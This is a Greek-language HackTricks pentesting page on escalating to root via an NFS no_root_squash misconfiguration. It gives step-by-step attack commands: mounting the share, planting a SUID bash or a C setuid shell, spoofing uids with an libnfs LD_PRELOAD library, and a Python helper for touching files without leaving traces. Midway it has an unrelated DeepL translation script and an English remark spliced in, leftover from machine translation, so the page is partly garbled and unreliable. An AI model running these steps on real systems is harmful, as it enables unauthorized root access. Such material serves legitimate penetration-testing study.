<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


Διαβάστε τον _ **/etc/exports** _ αρχείο, εάν βρείτε κάποιον κατάλογο που έχει ρυθμιστεί ως **no\_root\_squash**, τότε μπορείτε να τον **προσπελάσετε** από **έναν πελάτη** και να **γράψετε μέσα** σε αυτόν τον κατάλογο **ως** αν ήσασταν ο τοπικός **root** της μηχανής.

**no\_root\_squash**: Αυτή η επιλογή δίνει ουσιαστικά εξουσία στον χρήστη root στον πελάτη να έχει πρόσβαση σε αρχεία στον διακομιστή NFS ως root. Και αυτό μπορεί να οδηγήσει σε σοβαρές προβληματικές ασφαλείας.

**no\_all\_squash:** Αυτή είναι παρόμοια με την επιλογή **no\_root\_squash**, αλλά ισχύει για **μη-ριζικούς χρήστες**. Φανταστείτε ότι έχετε ένα κέλυφος ως χρήστης nobody· ελέγξτε το αρχείο /etc/exports· η επιλογή no\_all\_squash είναι παρούσα· ελέγξτε το αρχείο /etc/passwd· προσομοιώστε έναν μη-ριζικό χρήστη· δημιουργήστε ένα αρχείο suid ως αυτόν τον χρήστη (με τη χρήση του nfs). Εκτελέστε το suid ως χρήστης nobody και γίνετε διαφορετικός χρήστης.

# Εξάπλωση Προνομίων

## Απομακρυσμένη Εκμετάλλευση

Εάν έχετε βρει αυτήν την ευπάθεια, μπορείτε να την εκμεταλλευτείτε:

* **Προσαρτήστε αυτόν τον κατάλογο** σε μια μηχανή πελάτη και **ως root αντιγράψτε** μέσα στον προσαρτημένο φάκελο το δυαδικό αρχείο **/bin/bash** και δώστε του δικαιώματα **SUID**, και **εκτελέστε από τη μηχανή θύματος** αυτό το δυαδικό αρχείο bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Τοποθετήστε** αυτόν τον κατάλογο σε μια μηχανή πελάτη και **αντιγράψτε τον ως root** μέσα στον τοποθετημένο φάκελο τον μεταγλωττισμένο μας κακόβουλο κώδικα που θα εκμεταλλευτεί την άδεια SUID, θα του δώσει δικαιώματα SUID και θα τον εκτελέσει από τη μηχανή θύμα (μπορείτε να βρείτε εδώ μερικούς [C SUID κακόβουλους κώδικες](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Τοπική Εκμετάλλευση

{% hint style="info" %}
Σημειώστε ότι αν μπορείτε να δημιουργήσετε ένα **σωλήνα από τον υπολογιστή σας προς τον υπολογιστή του θύματος, μπορείτε ακόμα να χρησιμοποιήσετε την απομακρυσμένη έκδοση για να εκμεταλλευτείτε αυτήν την ανόδιση προνομίων διαμέσου της διάτρησης των απαιτούμενων θυρών**.\
Το παρακάτω κόλπο εφαρμόζετε στην περίπτωση που το αρχείο `/etc/exports` **υποδεικνύει μια διεύθυνση IP**. Σε αυτήν την περίπτωση, **δεν θα μπορείτε να χρησιμοποιήσετε** σε καμία περίπτωση την **απομακρυσμένη εκμετάλλευση** και θα χρειαστεί να **καταχραστείτε αυτό το κόλπο**.\
Ένα άλλο απαιτούμενο αίτημα για την εκμετάλλευση να λειτουργήσει είναι ότι **η εξαγωγή μέσα στο `/etc/export`** **πρέπει να χρησιμοποιεί τη σημαία `insecure`**.\
\--_Δεν είμαι σίγουρος αν αυτό το κόλπο θα λειτουργήσει αν το `/etc/export` υποδεικνύει μια διεύθυνση IP_--
{% endhint %}

## Βασικές Πληροφορίες

Το σενάριο περιλαμβάνει την εκμετάλλευση ενός προσαρτημένου κοινόχρηστου καταλόγου NFS σε έναν τοπικό υπολογιστή, εκμεταλλευόμενο ένα σφάλμα στην προδιαγραφή NFSv3 που επιτρέπει στον πελάτη να καθορίσει το uid/gid του, πιθανώς επιτρέποντας μη εξουσιοδοτημένη πρόσβαση. Η εκμετάλλευση περιλαμβάνει τη χρήση της [libnfs](https://github.com/sahlberg/libnfs), μιας βιβλιοθήκης που επιτρέπει την πλαστογράφηση κλήσεων RPC του NFS.

### Συγγραφή της Βιβλιοθήκης

Οι ενέργειες συγγραφής της βιβλιοθήκης μπορεί να απαιτούν προσαρμογές βάσει της έκδοσης του πυρήνα. Σε αυτήν τη συγκεκριμένη περίπτωση, οι κλήσεις συστήματος fallocate ήταν σχολιασμένες. Οι ενέργειες συγγραφής της βιβλιοθήκης περιλαμβάνουν τις παρακάτω εντολές:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Εκτέλεση της Εκμετάλλευσης

Η εκμετάλλευση περιλαμβάνει τη δημιουργία ενός απλού προγράμματος C (`pwn.c`) που ανεβαίνει τα προνόμια σε root και στη συνέχεια εκτελεί ένα κέλυφος. Το πρόγραμμα μεταγλωττίζεται και το παραγόμενο δυαδικό αρχείο (`a.out`) τοποθετείται στο κοινόχρηστο φάκελο με suid root, χρησιμοποιώντας το `ld_nfs.so` για να πλαστογραφήσει το uid στις κλήσεις RPC:

1. **Μεταγλωττίστε τον κώδικα εκμετάλλευσης:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Τοποθετήστε την εκμετάλλευση στον κοινόχρηστο φάκελο και τροποποιήστε τα δικαιώματά της πλαστογραφώντας το uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Εκτελέστε την εκμετάλλευση για να αποκτήσετε προνόμια root:**
```bash
/mnt/share/a.out
#root
```

## Μπόνους: NFShell για Αθόρυβη Πρόσβαση σε Αρχεία
Μόλις αποκτηθεί πρόσβαση root, για να αλληλεπιδράσετε με τον κοινόχρηστο φάκελο NFS χωρίς να αλλάξετε την ιδιοκτησία (για να αποφύγετε την αφή ενδείξεων), χρησιμοποιείται ένα σενάριο Python (nfsh.py). Αυτό το σενάριο προσαρμόζει το uid για να ταιριάζει με αυτό του αρχείου που πρόκειται να αποκτηθεί πρόσβαση, επιτρέποντας την αλληλεπίδραση με αρχεία στον κοινόχρηστο φάκελο χωρίς προβλήματα άδειας:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
```python
import requests

def translate_text(text):
    url = "https://api-free.deepl.com/v2/translate"
    params = {
        "auth_key": "your_auth_key",
        "text": text,
        "target_lang": "EL"
    }
    response = requests.post(url, params=params)
    translation = response.json()["translations"][0]["text"]
    return translation

def translate_file(file_path):
    with open(file_path, "r") as file:
        content = file.read()
        translated_content = translate_text(content)
    with open(file_path, "w") as file:
        file.write(translated_content)

translate_file("/hive/hacktricks/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.md")
```

This will translate the content of the specified file from English to Greek using the DeepL API. Make sure to replace "your_auth_key" with your actual DeepL API authentication key.
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Αναφορές
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
